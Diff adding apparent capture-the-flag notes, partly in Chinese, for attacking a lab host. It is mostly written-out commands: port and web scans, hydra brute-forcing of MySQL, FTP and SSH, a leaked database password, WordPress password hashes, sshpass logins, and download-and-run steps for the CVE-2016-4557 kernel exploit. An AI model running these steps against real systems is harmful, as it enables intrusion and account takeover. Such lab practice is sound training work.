@@ -1,0 +1,64 @@
+nmap -sV -sC -Pn 192.168.69.148 > nmap.txt
+nmap -p- 192.168.69.148 > nmapall.txt
+
+enum4linux 192.168.69.148
+
+gobuster dir  -u http://192.168.69.148  -w /usr/share/dirb/wordlists/common.txt -x txt,php > gobuster.txt
+gobuster dir  -u http://192.168.69.148:12380/  -w /usr/share/dirb/wordlists/common.txt -x txt,php > gobuster12380.txt
+nikto -h http://192.168.69.148 > nikto.txt
+
+
+MySQL默認帳密失敗
+mysql -u root -p -h 192.168.69.148
+MySQL爆破被ban
+hydra  -l root -P /usr/share/wordlists/rockyou.txt 192.168.69.148 mysql -t 4
+
+define('DB_NAME', 'wordpress');
+
+/** MySQL database username */
+define('DB_USER', 'root');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'plbkac');
+
+
+ John        $P$B7889EMq/erHIuZapMB8GEizebcIy9. 
+ Elly        $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 
+ Peter       $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 
+ barry       $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 
+ heather     $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 
+ garry       $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 
+ harry       $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 
+ scott       $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 
+ kathy       $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 
+ tim         $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 
+ ZOE         $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 
+ Dave        $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. 
+ Simon       $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 
+ Abby        $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. 
+ Vicki       $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 
+ Pam         $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 
+
+sshpass -p thisimypassword ssh JKanode@localhost
+apt-get install sshpass
+sshpass -p JZQuyIN5 ssh peter@192.168.69.148
+
+
+
+unzip 39772.zip
+tar xvf exploit.tar
+cd ebpf_mapfd_doubleput_exploit/
+chmod +x compile.sh
+./compile.sh
+./doubleput
+
+1.nmap找到21,80,port
+2.使用enum4linux找到用戶名
+3.使用用戶名list對ftp做爆破,得到 login: SHayslett   password: SHayslett
+hydra -L users.txt -P users.txt 192.168.69.148 ftp
+4.使用用戶名list對ssh做爆破,得到 login: SHayslett   password: SHayslett
+hydra -L users.txt -P users.txt 192.168.69.148 ssh
+5.內核漏洞提權
+[CVE-2016-4557] double-fdput()
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
+6.定時任務提權
